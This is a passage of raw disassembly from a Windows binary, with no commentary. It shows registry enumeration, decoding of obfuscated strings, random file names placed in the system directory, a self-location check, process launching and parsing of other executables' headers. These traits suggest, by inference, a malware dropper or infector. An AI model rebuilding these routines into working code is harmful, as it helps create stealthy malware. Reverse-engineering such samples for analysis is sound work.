		push	[ebp+lpSubKey]	; lpSubKey
		mov	esi, 400h
		xor	ebx, ebx
		mov	[ebp+cbValueName], esi
		push	[ebp+hKey]	; hKey
		mov	[ebp+cbData], esi
		call	ds:RegOpenKeyA
		test	eax, eax
		jz	short loc_404634
		xor	eax, eax
		jmp	short loc_4046A7
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404634:				; CODE XREF: sub_404604+2Aj
					; sub_404604+8Fj
		lea	eax, [ebp+cbData]
		mov	[ebp+cbValueName], esi
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		lea	eax, [ebp+cbValueName]
		push	0		; lpReserved
		push	eax		; lpcbValueName
		lea	eax, [ebp+ValueName]
		mov	[ebp+cbData], esi
		push	eax		; lpValueName
		push	ebx		; dwIndex
		push	[ebp+phkResult]	; hKey
		call	ds:RegEnumValueA
		test	eax, eax
		jnz	short loc_404699
		cmp	[ebp+Type], 1
		jnz	short loc_404692
		cmp	[ebp+arg_8], eax
		jz	short loc_404692
		and	[ebp+var_C], eax
		push	[ebp+arg_C]
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+ValueName]
		push	eax
		push	[ebp+lpSubKey]
		push	[ebp+hKey]
		call	[ebp+arg_8]
		add	esp, 14h
		cmp	[ebp+var_C], 0
		jnz	short loc_404695

loc_404692:				; CODE XREF: sub_404604+64j
					; sub_404604+69j
		inc	ebx
		jmp	short loc_404634
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404695:				; CODE XREF: sub_404604+8Cj
		mov	esi, eax
		jmp	short loc_40469C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404699:				; CODE XREF: sub_404604+5Ej
		push	1
		pop	esi

loc_40469C:				; CODE XREF: sub_404604+93j
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey
		mov	eax, esi

loc_4046A7:				; CODE XREF: sub_404604+2Ej
		pop	esi
		pop	ebx
		leave
		retn
sub_404604	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4046AB	proc near		; CODE XREF: sub_401841+Ap
					; sub_4018E9+B4p ...

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jnz	short loc_4046BB
		cmp	dword_4119DC, 0
		jnz	short loc_4046D2

loc_4046BB:				; CODE XREF: sub_4046AB+5j
		call	ds:GetTickCount
		push	eax
		call	sub_407BA5
		pop	ecx
		call	_rand
		mov	dword_4119DC, eax

loc_4046D2:				; CODE XREF: sub_4046AB+Ej
		jmp	_rand
sub_4046AB	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4046D7	proc near		; CODE XREF: sub_4058ED+F6p
					; sub_40686A+10Ep ...

StartupInfo	= _STARTUPINFOA	ptr -54h
ProcessInformation= _PROCESS_INFORMATION ptr -10h
lpApplicationName= dword ptr  8
lpCommandLine	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		push	esi
		xor	esi, esi
		push	44h		; size_t
		lea	eax, [ebp+StartupInfo]
		push	esi		; int
		push	eax		; void *
		call	_memset
		add	esp, 0Ch
		lea	eax, [ebp+ProcessInformation]
		mov	[ebp+StartupInfo.cb], 44h
		push	eax		; lpProcessInformation
		lea	eax, [ebp+StartupInfo]
		push	eax		; lpStartupInfo
		push	esi		; lpCurrentDirectory
		push	esi		; lpEnvironment
		push	esi		; dwCreationFlags
		push	esi		; bInheritHandles
		push	esi		; lpThreadAttributes
		push	esi		; lpProcessAttributes
		push	[ebp+lpCommandLine] ; lpCommandLine
		push	[ebp+lpApplicationName]	; lpApplicationName
		call	ds:CreateProcessA
		neg	eax
		sbb	eax, eax
		pop	esi
		and	eax, [ebp+ProcessInformation.hProcess]
		leave
		retn
sub_4046D7	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40471A	proc near		; CODE XREF: sub_40478D+44p
					; sub_404821+7Ep ...

var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	edi
		lea	ecx, [ebp+var_14]
		call	sub_40174B
		lea	eax, [ebp+var_4]
		push	1
		push	eax
		lea	ecx, [ebp+var_14]
		push	[ebp+arg_0]
		xor	ebx, ebx
		call	sub_40174E
		mov	edi, eax
		test	edi, edi
		jz	short loc_404789
		mov	ecx, [ebp+var_4]
		mov	eax, 1000h
		add	ecx, 0FFFFFC18h
		push	esi
		cmp	ecx, eax
		mov	esi, eax
		jbe	short loc_40477E

loc_404758:				; CODE XREF: sub_40471A+5Dj
		lea	eax, [esi+edi]
		push	eax		; char *
		push	offset aI	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_40477B
		mov	eax, [ebp+var_4]
		inc	esi
		add	eax, 0FFFFFC18h
		cmp	esi, eax
		jb	short loc_404758
		jmp	short loc_40477E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40477B:				; CODE XREF: sub_40471A+50j
		push	1
		pop	ebx

loc_40477E:				; CODE XREF: sub_40471A+3Cj
					; sub_40471A+5Fj
		lea	ecx, [ebp+var_14]
		call	sub_401808
		mov	eax, ebx
		pop	esi

loc_404789:				; CODE XREF: sub_40471A+27j
		pop	edi
		pop	ebx
		leave
		retn
sub_40471A	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40478D	proc near		; DATA XREF: sub_4048EF+64o

var_400		= byte ptr -400h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 400h
		push	(offset	aP_wqsknsknvTTW+17h)
		push	[ebp+arg_8]
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_40481C
		lea	eax, [ebp+var_400]
		push	400h
		push	eax
		and	[ebp+var_400], 0
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_4044E4
		lea	eax, [ebp+var_400]
		push	eax
		call	sub_40471A
		add	esp, 18h
		test	eax, eax
		jz	short loc_40481C
		mov	ecx, [ebp+arg_10]
		push	1
		pop	eax
		push	[ebp+arg_4]	; char *
		mov	[ecx], eax
		mov	ecx, [ebp+arg_C]
		push	offset unk_491AE8 ; char *
		mov	[ecx], eax
		call	_strcpy
		lea	eax, [ebp+var_400]
		push	eax		; char *
		push	offset FileName	; char *
		call	_strcpy
		push	[ebp+arg_8]	; char *
		push	offset unk_4919E4 ; char *
		call	_strcpy
		add	esp, 18h
		xor	eax, eax
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40481C:				; CODE XREF: sub_40478D+1Aj
					; sub_40478D+4Ej
		push	1
		pop	eax
		leave
		retn
sub_40478D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404821	proc near		; DATA XREF: sub_4048EF+26o

var_800		= byte ptr -800h
var_400		= byte ptr -400h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 800h
		push	[ebp+arg_4]	; char *
		lea	eax, [ebp+var_400]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_400]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		push	[ebp+arg_8]	; char *
		lea	eax, [ebp+var_400]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_400]
		push	(offset	aP_wqsknsknvTTW+17h)
		push	eax
		call	sub_403B7D
		add	esp, 20h
		test	eax, eax
		jz	short loc_4048EA
		lea	eax, [ebp+var_800]
		and	[ebp+var_800], 0
		push	400h
		push	eax
		lea	eax, [ebp+var_400]
		push	(offset	aP_wqsknsknvTTW+1Dh)
		push	eax
		push	[ebp+arg_0]
		call	sub_4044E4
		lea	eax, [ebp+var_800]
		push	eax
		call	sub_40471A
		add	esp, 18h
		test	eax, eax
		jz	short loc_4048EA
		mov	ecx, [ebp+arg_10]
		push	1
		pop	eax
		push	[ebp+arg_4]	; char *
		mov	[ecx], eax
		mov	ecx, [ebp+arg_C]
		push	offset unk_491AE8 ; char *
		mov	[ecx], eax
		call	_strcpy
		lea	eax, [ebp+var_800]
		push	eax		; char *
		push	offset FileName	; char *
		call	_strcpy
		push	[ebp+arg_8]	; char *
		push	offset unk_4919E4 ; char *
		call	_strcpy
		add	esp, 18h
		xor	eax, eax
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4048EA:				; CODE XREF: sub_404821+4Ej
					; sub_404821+88j
		push	1
		pop	eax
		leave
		retn
sub_404821	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4048EF	proc near		; CODE XREF: sub_4053E8:loc_4054A8p

Buffer		= byte ptr -51Ch
var_418		= byte ptr -418h
var_18		= byte ptr -18h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 51Ch
		and	[ebp+var_4], 0
		cmp	dword_491EF8, 0
		jnz	short loc_40492A
		push	4
		push	offset aTW@WT@Y@WwYteW ; "ÇÙ]TÕŞWÜ@ÈÚßWÙ×Ù]T@ÅÚY\\ÙÕ×@ÏÔWWÜYTEÜW×Ú"...
		call	sub_403434
		lea	ecx, [ebp+var_4]
		push	ecx
		push	offset sub_404821
		push	eax
		push	80000002h
		call	sub_404586
		add	esp, 18h
		jmp	short loc_404966
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40492A:				; CODE XREF: sub_4048EF+14j
		lea	eax, [ebp+var_418]
		push	2
		push	eax
		call	sub_403BD8
		lea	eax, [ebp+var_418]
		push	eax		; char *
		push	offset unk_491AE8 ; char *
		call	_strcpy
		lea	eax, [ebp+var_4]
		push	eax
		lea	eax, [ebp+var_418]
		push	offset sub_40478D
		push	eax
		push	80000002h
		call	sub_404604
		add	esp, 20h

loc_404966:				; CODE XREF: sub_4048EF+39j
		mov	eax, [ebp+var_4]
		test	eax, eax
		mov	dword_491EFC, eax
		jnz	loc_404A47
		push	esi
		lea	eax, [ebp+Buffer]
		push	104h		; uSize
		push	eax		; lpBuffer
		call	ds:GetSystemDirectoryA
		xor	esi, esi

loc_40498B:				; CODE XREF: sub_4048EF+12Fj
		and	[ebp+var_18], 0
		lea	eax, [ebp+var_18]
		push	(offset	aP_wqsknsknvTTW+17h) ; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+var_18]
		pop	ecx
		push	4
		push	4
		push	2
		push	eax		; char *
		call	_strlen
		pop	ecx
		lea	eax, [ebp+eax+var_18]
		push	eax
		call	sub_403624
		lea	eax, [ebp-17h]
		push	eax		; char *
		call	__strlwr
		lea	eax, [ebp+Buffer]
		push	eax		; char *
		lea	eax, [ebp+var_418]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_418]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_18]
		push	eax		; char *
		lea	eax, [ebp+var_418]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_418]
		push	offset aYRNyWnyvNy_Tnn ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_418]
		push	eax
		call	sub_403D58
		add	esp, 38h
		test	eax, eax
		jz	short loc_404A24
		inc	esi
		cmp	esi, 0Ah
		jl	loc_40498B

loc_404A24:				; CODE XREF: sub_4048EF+129j
		lea	eax, [ebp+var_18]
		push	eax		; char *
		push	offset unk_4919E4 ; char *
		call	_strcat
		lea	eax, [ebp+var_418]
		push	eax		; char *
		push	offset FileName	; char *
		call	_strcpy
		add	esp, 10h
		pop	esi

loc_404A47:				; CODE XREF: sub_4048EF+81j
		push	1
		pop	eax
		leave
		retn
sub_4048EF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_404A4C	proc near		; CODE XREF: sub_4018E9+54p

arg_0		= dword	ptr  4
arg_4		= word ptr  8

		mov	eax, [esp+arg_0]
		mov	cx, [esp+arg_4]
		add	[eax+2], cx
		mov	cx, [eax+2]

loc_404A5D:				; CODE XREF: sub_404A4C+23j
		cmp	cx, 1
		jge	short loc_404A71
		add	word ptr [eax+2], 1Eh
		mov	cx, [eax+2]
		dec	word ptr [eax]
		jmp	short loc_404A5D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404A71:				; CODE XREF: sub_404A4C+15j
		cmp	word ptr [eax+2], 1Fh
		jle	short loc_404A8A

loc_404A78:				; CODE XREF: sub_404A4C+3Cj
		add	word ptr [eax+2], 0FFE2h
		mov	cx, [eax+2]
		inc	word ptr [eax]
		cmp	cx, 1Fh
		jg	short loc_404A78

loc_404A8A:				; CODE XREF: sub_404A4C+2Aj
		mov	cx, [eax]
		cmp	cx, 1
		jge	short loc_404A99
		add	ecx, 0Ch
		mov	[eax], cx

loc_404A99:				; CODE XREF: sub_404A4C+45j
		mov	cx, [eax]
		cmp	cx, 0Ch
		jle	short locret_404AA8
		add	ecx, 0FFFFFFF4h
		mov	[eax], cx

locret_404AA8:				; CODE XREF: sub_404A4C+54j
		retn
sub_404A4C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_404AA9	proc near		; CODE XREF: sub_4066D2+8Fp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_8]
		push	esi
		mov	esi, [esp+4+arg_0]
		push	edi
		mov	edi, [esp+8+arg_4]
		and	byte ptr [edi],	0
		and	byte ptr [eax],	0
		cmp	byte ptr [esi],	5Ch
		jnz	short loc_404B1A
		cmp	byte ptr [esi+1], 5Ch
		jnz	short loc_404B1A
		push	ebx
		push	offset asc_40E0B8 ; char *
		push	edi		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [esi+2]
		pop	ecx
		mov	cl, [eax]
		push	2
		cmp	cl, 5Ch
		pop	edx
		jz	short loc_404AFA
		mov	ebx, edi
		sub	ebx, esi

loc_404AE7:				; CODE XREF: sub_404AA9+4Fj
		test	cl, cl
		jz	short loc_404AFA
		mov	cl, [eax]
		inc	edx
		mov	[ebx+eax], cl
		mov	cl, [eax+1]
		inc	eax
		cmp	cl, 5Ch
		jnz	short loc_404AE7

loc_404AFA:				; CODE XREF: sub_404AA9+38j
					; sub_404AA9+40j
		and	byte ptr [edx+edi], 0
		add	edx, esi
		pop	ebx
		cmp	byte ptr [edx],	0
		jnz	short loc_404B0A
		push	2
		jmp	short loc_404B1C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404B0A:				; CODE XREF: sub_404AA9+5Bj
		push	edx		; char *
		push	[esp+0Ch+arg_8]	; char *
		call	_strcpy
		pop	ecx
		xor	eax, eax
		pop	ecx
		jmp	short loc_404B1D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404B1A:				; CODE XREF: sub_404AA9+17j
					; sub_404AA9+1Dj
		push	1

loc_404B1C:				; CODE XREF: sub_404AA9+5Fj
		pop	eax

loc_404B1D:				; CODE XREF: sub_404AA9+6Fj
		pop	edi
		pop	esi
		retn
sub_404AA9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404B20	proc near		; CODE XREF: sub_406FF0+35p
					; WinMain(x,x,x,x):loc_4070BDp

var_410		= byte ptr -410h
var_30C		= byte ptr -30Ch
var_208		= byte ptr -208h
Filename	= byte ptr -104h

		push	ebp
		mov	ebp, esp
		sub	esp, 410h
		push	esi
		lea	eax, [ebp+var_30C]
		push	offset FileName	; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+Filename]
		pop	ecx
		xor	esi, esi
		push	104h		; nSize
		push	eax		; lpFilename
		push	esi		; hModule
		call	ds:GetModuleFileNameA
		push	esi		; char *
		lea	eax, [ebp+var_410]
		push	esi		; char *
		push	eax		; char *
		lea	eax, [ebp+var_30C]
		push	esi		; char *
		push	eax		; char *
		call	__splitpath
		push	esi		; char *
		lea	eax, [ebp+var_208]
		push	esi		; char *
		push	eax		; char *
		lea	eax, [ebp+Filename]
		push	esi		; char *
		push	eax		; char *
		call	__splitpath
		lea	eax, [ebp+var_208]
		push	eax
		lea	eax, [ebp+var_410]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 30h
		neg	eax
		sbb	eax, eax
		pop	esi
		inc	eax
		leave
		retn
sub_404B20	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_404B9C	proc near		; CODE XREF: sub_404BDB+Ep
					; sub_404CF1+B3p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+arg_4]
		cmp	esi, 44h
		jb	short loc_404BD7
		mov	ecx, [esp+arg_0]
		cmp	byte ptr [ecx],	4Dh
		jnz	short loc_404BD7
		cmp	byte ptr [ecx+1], 5Ah
		jnz	short loc_404BD7
		movzx	eax, word ptr [ecx+3Ch]
		add	eax, ecx
		add	esi, 0FFFFFFFCh
		mov	edx, eax
		sub	edx, ecx
		cmp	edx, esi
		ja	short loc_404BD7
		mov	eax, [eax]
		pop	esi
		sub	eax, 4550h
		neg	eax
		sbb	eax, eax
		not	eax
		and	eax, edx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404BD7:				; CODE XREF: sub_404B9C+8j
					; sub_404B9C+11j ...
		xor	eax, eax
		pop	esi
		retn
sub_404B9C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404BDB	proc near		; CODE XREF: sub_404CF1+81p
					; sub_404CF1+9Bp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+arg_8]
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	ebx
		push	esi
		call	sub_404B9C
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_404C44
		lea	ecx, [eax+esi]
		mov	esi, [ebp+arg_4]
		mov	edx, [ecx+74h]
		lea	eax, [ecx+74h]
		cmp	edx, esi
		jb	short loc_404C44
		movzx	ecx, word ptr [ecx+6]
		mov	esi, [eax+esi*8-4]
		add	eax, 4
		xor	edi, edi
		test	ecx, ecx
		lea	eax, [eax+edx*8+8]
		jbe	short loc_404C44
		add	ebx, 0FFFFFFFCh
		mov	[ebp+arg_8], ebx

loc_404C1F:				; CODE XREF: sub_404BDB+63j
		mov	edx, eax
		sub	edx, [ebp+arg_0]
		cmp	edx, [ebp+arg_8]
		jnb	short loc_404C44
		mov	edx, [eax+4]
		mov	ebx, [eax]
		add	ebx, edx
		cmp	ebx, esi
		jbe	short loc_404C38
		cmp	edx, esi
		jbe	short loc_404C40

loc_404C38:				; CODE XREF: sub_404BDB+57j
		add	eax, 28h
		inc	edi
		cmp	edi, ecx
		jb	short loc_404C1F

loc_404C40:				; CODE XREF: sub_404BDB+5Bj
		cmp	edi, ecx
		jb	short loc_404C46

loc_404C44:				; CODE XREF: sub_404BDB+17j
					; sub_404BDB+27j ...
		xor	eax, eax

loc_404C46:				; CODE XREF: sub_404BDB+67j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_404BDB	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404C4B	proc near		; CODE XREF: sub_404C4B+61p
					; sub_404CF1+139p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		mov	edi, [ebp+arg_0]
		lea	eax, [esi+10h]
		mov	[ebp+arg_4], eax
		mov	eax, esi
		sub	eax, edi
		add	eax, 10h
		cmp	eax, [ebp+arg_10]
		ja	loc_404CED
		movzx	eax, word ptr [esi+0Eh]
		movzx	ecx, word ptr [esi+0Ch]
		and	[ebp+arg_0], 0
		add	eax, ecx
		test	eax, eax
		jle	short loc_404CE5
		mov	ebx, [ebp+arg_C]

loc_404C82:				; CODE XREF: sub_404C4B+98j
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+arg_10]
		sub	eax, edi
		add	eax, 8
		cmp	eax, ecx
		ja	short loc_404CE5
		mov	eax, [ebp+arg_4]
		mov	eax, [eax+4]
		test	eax, 80000000h
		jz	short loc_404CBA
		push	ecx
		push	ebx
		push	[ebp+arg_8]
		and	eax, 7FFFFFFFh
		add	eax, edi
		push	eax
		push	edi
		call	sub_404C4B
		add	esp, 14h
		test	eax, eax
		jz	short loc_404CED
		jmp	short loc_404CCF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404CBA:				; CODE XREF: sub_404C4B+51j
		mov	edx, ebx
		add	eax, edi
		sub	edx, [ebp+arg_8]
		add	[eax], edx
		mov	eax, [eax]
		cmp	eax, ebx
		jb	short loc_404CED
		add	ecx, ebx
		cmp	eax, ecx
		jnb	short loc_404CED

loc_404CCF:				; CODE XREF: sub_404C4B+6Dj
		movzx	eax, word ptr [esi+0Eh]
		movzx	ecx, word ptr [esi+0Ch]
		add	[ebp+arg_4], 8
		inc	[ebp+arg_0]
		add	eax, ecx
		cmp	[ebp+arg_0], eax
		jl	short loc_404C82

loc_404CE5:				; CODE XREF: sub_404C4B+32j
					; sub_404C4B+44j
		push	1
		pop	eax

loc_404CE8:				; CODE XREF: sub_404C4B+A4j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404CED:				; CODE XREF: sub_404C4B+1Cj
					; sub_404C4B+6Bj ...
		xor	eax, eax
		jmp	short loc_404CE8
sub_404C4B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404CF1	proc near		; CODE XREF: sub_40565D+F1p

var_3C		= dword	ptr -3Ch
var_2C		= dword	ptr -2Ch
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	esi
		lea	ecx, [ebp+var_2C]
		call	sub_40174B
		lea	ecx, [ebp+var_3C]
		call	sub_40174B
		lea	eax, [ebp+var_4]
		push	1
		push	eax
		xor	esi, esi
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_3C]
		mov	[ebp+var_8], esi
		mov	[ebp+var_4], esi
		mov	[ebp+var_C], esi
		mov	[ebp+var_10], esi
		call	sub_40174E
		cmp	eax, esi
		mov	[ebp+arg_4], eax
		jnz	short loc_404D35
		xor	eax, eax
		jmp	loc_404E99
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404D35:				; CODE XREF: sub_404CF1+3Bj
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_8]
		push	ebx
		lea	eax, [eax+ecx+1000h]
		push	eax
		push	[ebp+arg_0]
		call	sub_403F63
		pop	ecx
		lea	eax, [ebp+var_8]
		pop	ecx
		push	esi
		push	eax
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_2C]
		call	sub_40174E
		mov	ebx, eax
		cmp	ebx, esi
